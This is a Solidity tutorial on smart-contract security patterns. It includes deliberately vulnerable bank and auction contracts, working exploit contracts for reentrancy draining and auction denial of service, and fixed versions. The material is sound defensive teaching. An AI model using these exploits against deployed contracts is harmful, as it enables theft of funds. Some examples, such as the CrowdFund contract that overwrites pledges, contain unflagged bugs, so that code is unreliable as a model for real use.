# Hands-on: Solidity Patterns

In this material, I focused on coding patterns for Solidity. Due to the blockchain environment, some common programming practices for other languages may not be suited for a secure smart contract.

## 1. Privacy

Privacy is a big issue in the blockchain platforms, and common programming practices may not protect our information the way we are used to. Let's use for example a Bank contract (this bank could store tokens or Ether, for the coding example it does not matter).

```solidity
pragma solidity^0.4.24;
/**
 * @title Bank Unsecured (privacy compromised)
 * @author Henrique
 */
contract Bank {
    struct Client {uint id; string name; string phone; string _address; uint balance;}
    mapping(uint=>Client) private clients;
    address private owner;
     
    constructor() public{ owner = msg.sender; }
   
    function addClient(uint id, string name, string phone, string _address) public {
        require(owner == msg.sender);
        clients[id] = Client(id,name,phone,_address,0);
    }
     
    function deposit(uint id) public { }
    function withdraw(uint id, uint amount) public { }
} //end of contract
```

All information in the blockchain is public and visible to anyone. Therefore, developers must ensure data privacy by themselves. The private visibility prevents others to modify an attribute, but its contents are still visible to anyone in the blockchain. In the above example, anyone would be able to see your clients' sensible information (name, phone, address).

The first rule of privacy in the blockchain is to avoid storing sensible information. To make our Bank contract more secure, we are not going to store clients information. We also are going to use the client's blockchain address for control (since it is already hashed and public information on the blockchain). 

```solidity
pragma solidity^0.4.24;
/**
 * @title Private Bank 
 * @author Henrique
 */
contract Bank {
    struct Client {address add; uint balance;}
    mapping(address=>Client) private clients;
    address private owner;
     
    constructor() public{ owner = msg.sender; }

    function addClient(address clientAddress) public {
        require(owner == msg.sender);
        clients[clientAddress] = Client(clientAddress,0);
    }
     
    function deposit() public { }
    function withdraw(uint amount) public { }
} //end of contract
```

The most used practice to ensure data privacy is to Hash the information. A hash will have no meaning to anyone looking at, but for the developer is easy to verify. Bellow, there is a code snippet of hashing a number and the user's address (ideally this should be done offline outside the blockchain)

```solidity
function encode(uint number) public view returns (bytes32){
    return keccak256(abi.encodePacked(number, msg.sender));
}
```

Another used practice is to have a secondary private database for sensible information, and storing the hash in the private DB and using such hash in the blockchain (that way it is easier to find the information in your private DB and link with the blockchain data). 

## 2. Random Generation

At first glance, random number generation may not seem like a problem. However, it is very tricky to create a truly random number in Solidity (if you don’t want people to cheat). 

Miners have access to any environment variables (e.g., timestamp, blockhash) and also the contract's internal state before executing your contract. Moreover, a miner can (and probably will) manipulate some of the environment variables to get an advantage. Therefore, we should not rely on these variables (like a timestamp) to generate random numbers. 

There are many Random number generation patterns for Solidity. Each pattern varies a lot depending on the requirements and usage of the random numbers. Thus, I will not present any, I just want to reinforce the caution. Here is a [link](https://medium.com/@promentol/lottery-smart-contract-can-we-generate-random-numbers-in-solidity-4f586a152b27) to discussing a Lottery smart contract and random generation. 

## 3. State Machine

A common pattern in contracts is to make then act as a state machine. We use an ```enum``` to define the states, and an attribute to control which state the contract is currently in. A function can change the contract state into a different one. Moreover, some functions can become unavailable (or behave differently) depending on which state the contract is.

For example, let's code a cryptocurrency Crowdfund contract. The states are very simple, when we create the contract the crowdfunding is "Open". The contract can only receive pledges when it is "Open". After its expiration, if the total money raised equals or exceeds the minimum required, then the contract is "Closed" and the money is given to the person who created the crowdfund. Otherwise, the contract goes to a "refund" state, and everyone who contributed can ask for their refund. 

```solidity
pragma solidity^0.4.24;
/**
 * @title Crowdfunding contract  
 * @author Henrique
 */ 
contract CrowdFund{
    enum State { Open, Refund, Closed }
    address private owner;
    uint totalraised;
    string fundUrl;
    mapping (address=>uint) pledges;
    uint minimumRequired;
    uint expiration; //in days
    State currentState = State.Open;
    
    constructor(string url, uint min, uint exp) public {
        owner = msg.sender;
        fundUrl = url;
        minimumRequired = min;
        expiration = now + (exp * 1 days);
    }
    
    function contribute() public payable{
        checkExpiration();
        require(currentState == State.Open,"Cannot contribute to an expired Crowdfund.");
        pledges[msg.sender] = msg.value;
        totalraised += msg.value;
    }
    
    function refund() public {
        require(currentState == State.Refund,"Crowfund is not refunding yet.");
        uint amount = pledges[msg.sender]; 
        pledges[msg.sender]=0;
        msg.sender.transfer(amount);
    }
    
    function checkExpiration() public {
        require(currentState == State.Open,"Contract is already expired");
        if(now >= expiration){
            if(totalraised >= minimumRequired){
                currentState = State.Closed;
                getFunds();
            }
            else{
                currentState = State.Refund;
            }
        }
    }
    
    function getFunds() public {
        require(owner == msg.sender,"Only owner can get the funds.");
        require(currentState == State.Closed,"Crowdfund is not closed yet.");
        owner.transfer( address(this).balance );
    }   
} //end of contract
```

## 4. Reentrancy

Reentrancy is the name of a major security flaw in a smart contract. Much like SQL-injection, it is caused by insecure coding practices. For example, consider the following Bank contract, in this bank people store their Ether.

```solidity
pragma solidity^0.4.24;
/**
 * @title Ether Bank Unsecured
 * @author Henrique
 */
contract Bank{
    mapping(address=>uint) private balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;    
    }
    
    function withdraw() public {
        if(msg.sender.call.value(balances[msg.sender])())
            balances[msg.sender] = 0;
    }

    function checkBalance() public view returns(uint){
        return balances[msg.sender];
    }
    
    function vault() public view returns(uint){
        return address(this).balance;
    }
} //end of contract
```

Can you identify the problem in the above contract? Don't worry if you cannot, it is tricky to see it if you are not used to Solidity. I will give you one more clue, the problem is in the withdraw function.

Any call to another address hands the control to that address. This includes any transfer of Ether. If the address is an account, nothing can happen. __However__, if the address is another contract (receiver) it can execute any code before giving back the control to the original contract. The receiver can even call the original contract again before the current function execution is resolved, therein lies the problem. 

When we use "transfer" or "send", reentrancy is not serious because these functions have a gas limitation that prohibits the receiver to execute anything other than log one event. Using "call" is a different story. In the last example, we could drain all Ether from the contract by using the contract below.

```solidity
pragma solidity^0.4.24;
/**
 * @title Exploit Reentrancy Flaw
 * @author Henrique
 */
contract ExploitReentrancy{
    address private owner;
    Bank private bank;
    
    constructor() public{
        owner = msg.sender;
    }
    
    function setBank(address bank_address) public {
        bank = Bank(bank_address);
    }
    
    function deposit() public payable returns (uint){
        bank.deposit.value( msg.value )();
        return bank.checkBalance();
    }
    
    function getFunds() public {
        require(owner == msg.sender);
        owner.transfer( address(this).balance );
    }

    function exploit() public {
        require(owner == msg.sender);
        bank.withdraw();
    }
        
    function() public payable {
        uint balance = bank.checkBalance();
        if( address(bank).balance >= balance ){
            bank.withdraw();
        }
    }
} //end of contract

interface Bank{ //interface to use bank functions
    function deposit() external payable ;
    function withdraw() external;
    function checkBalance() external view returns(uint);
}
```

The security issue happens in the "exploit" and fallback functions. The remaining functions are to just for set-up. In this case, the contract ExploitReentracy becomes one of the Bank clients and deposits something. When we call the "exploit" function, the contract performs a bank withdraw. The withdraw function will send the funds from the Bank to ExploitReentrancy, which will trigger the execution of the fallback function before the Bank has a chance to update the balance on this address. Therefore, in the fallback, we just call withdraw again, and the Bank will send our funds again and trigger another execution of the fallback function. This will go on until we drain all Ether from the bank.

In fact, the infamous DAO attack that drained approximately 50 million dollars worth of cryptocurrency was caused by a Reentrancy flaw. The attacker probably used a contract similar to the one I presented.

How can we avoid a reentrancy flaw? There is a simple pattern that should always be used when calling an external address. Always update the internal contract state before calling external functions (also called checks-effects-interactions pattern). Another important note is to use "transfer" or "send" instead of "call" (both transfer and send are safer by design).

For example, the Bank contract bellow would not be affected by reentrancy. See that we are not forbidden someone to call the original contract again, but an attacker would not gain any benefit from doing so.

```solidity
pragma solidity^0.4.24;
/**
 * @title Ether Bank Safe Re-entrancy
 * @author Henrique
 */
contract Bank{
    mapping(address=>uint) private balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;    
    }
    
    function withdraw() public {
        uint user_balance = balances[msg.sender]; //check the balance
        balances[msg.sender] = 0; //update the variable before external call
        msg.sender.call.value(user_balance)(); //Now do the call
        //Better to use transfer as shown in the line below, but even with call is safe
        //msg.sender.transfer( user_balance );
    }
    
    function checkBalance() public view returns(uint){
        return balances[msg.sender];
    }
    
    function vault() public view returns(uint){
        return address(this).balance;
    }
} //end of contract
```

## 5. Withdraw Pattern

Even if we protect our contract against reentrancy, someone can still try to take advantage on it. Consider the following Auction contract, and try to see the flaw on it.

```solidity
pragma solidity^0.4.24;
/**
 * @title Auction Unsafe
 * @author Henrique
 */
contract Auction {
    address owner;
    address winner;
    uint winning_bid;

    enum State{ Accepting_Bids, Auction_Closed }
    State private state = State.Accepting_Bids;

    constructor() public {
        owner = msg.sender;
        winning_bid = 0;
        winner = owner;
    }
    
    function bid() public payable{
        require(state == State.Accepting_Bids, "Auction closed.");
        require(msg.value > winning_bid,"Invalid bid."); //check
        //effects
        address oldwinner = winner;
        uint oldbid = winning_bid;
        winner = msg.sender;
        winning_bid = msg.value;
        //interactions
        oldwinner.transfer( oldbid );
    }
    
    function closeAuction() public{
        require(owner == msg.sender,"Only owner can close the auction.");
        require(state == State.Accepting_Bids,"Auction already closed.");
        state = State.Auction_Closed;
        owner.transfer( winning_bid );
    }
} //end of contract
```

Can you identify the problem? This one is more tricky than the reentrancy flaw. The potential problem that an attacker can exploit is on the "bid" function. Please note that "bid" is reentrancy safe, as we used the checks-effects-interactions pattern.

Seems counter-intuitive but sending funds right after an effect may not be the best way. There is the potential risk for an attacker to cause the transfer to fail on purpose and keep the contract from ever performing its function. In the last example, it would be impossible to “out-bid” the attacker (causing him to win the auction). Here is a very simple contract an attacker could use.

```solidity
pragma solidity^0.4.24;
/**
 * @title Exploiting Unsafe Auction contract
 * @author Henrique
 */
contract ExploitAuction {
    
    function makeMyBid(address auction_address) public payable {
        Auction auction = Auction(auction_address);
        auction.bid.value(msg.value)();
    }
    
    function() public payable{
        revert(); //always raise an exception
    }
}

interface Auction{ //interface to use the functions on Auction
    function bid() external payable;
}
```

The function "makeMyBid" calls the "bid" on the Auction contract. When someone else tries to outbid the attacker on the Auction contract, the transfer (last line on the "bid" function) will trigger the fallback function on the ExpoitAuction contract. The fallback will raise an exception which will propagate to the bid and undo all changes. Therefore, no one would be able to outbid the attacker.

Use the “Withdraw pattern” to avoid this risk. The pattern is to make each account responsible to withdraw his own funds. In this case, the responsibility to get back their losing bids is delegated to the accounts, which will have to call another function to that. The contract bellow implements an Auction with this pattern.

```solidity
pragma solidity^0.4.24;
/**
 * @title Auction State Machine
 * @author Henrique
 */
contract Auction {
    address owner;
    address winner;
    uint winning_bid;
    mapping(address=>uint) losing_bids;

    enum State{ Accepting_Bids, Auction_Closed }
    State private state = State.Accepting_Bids;
    
    constructor() public {
        owner = msg.sender;
        winning_bid = 0;
        winner = owner;
    }
    
    function bid() public payable{
        require(state == State.Accepting_Bids, "Auction closed.");
        require(msg.value > winning_bid,"Invalid bid.");
    
        losing_bids[winner] += winning_bid;
        winner = msg.sender;
        winning_bid = msg.value;
    }
    
    function withdraw() public {
        uint lost_bids = losing_bids[msg.sender];
        losing_bids[msg.sender] = 0;
        msg.sender.transfer( lost_bids );
    }
    
    function closeAuction() public {
        require(owner == msg.sender,"Only owner can close the auction.");
        require(state == State.Accepting_Bids,"Auction already closed.");
        state = State.Auction_Closed;
        owner.transfer( winning_bid );
    }
} //end of contract
```


